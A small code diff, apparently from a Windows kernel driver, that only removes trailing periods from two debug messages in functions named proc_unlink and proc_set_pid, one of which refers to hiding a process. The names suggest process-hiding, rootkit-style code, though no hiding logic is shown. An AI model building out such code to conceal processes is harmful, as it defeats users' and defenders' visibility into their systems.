@@ -5,7 +5,7 @@ NTSTATUS proc_unlink(PUINT32 procid)
 {
         UINT32 pid = *procid;
         if (!pid) {
-                DbgPrint(DRIVER_PREFIX "invalid PID for Hide.");
+                DbgPrint(DRIVER_PREFIX "invalid PID for Hide");
                 return STATUS_SUCCESS;
         }
 
@@ -37,7 +37,7 @@ NTSTATUS proc_set_pid(PUINT32 procid)
 {
         UINT32 pid = *procid;
         if (!pid) {
-                DbgPrint(DRIVER_PREFIX "invalid PID for Set.");
+                DbgPrint(DRIVER_PREFIX "invalid PID for Set");
                 return STATUS_SUCCESS;
         }
 
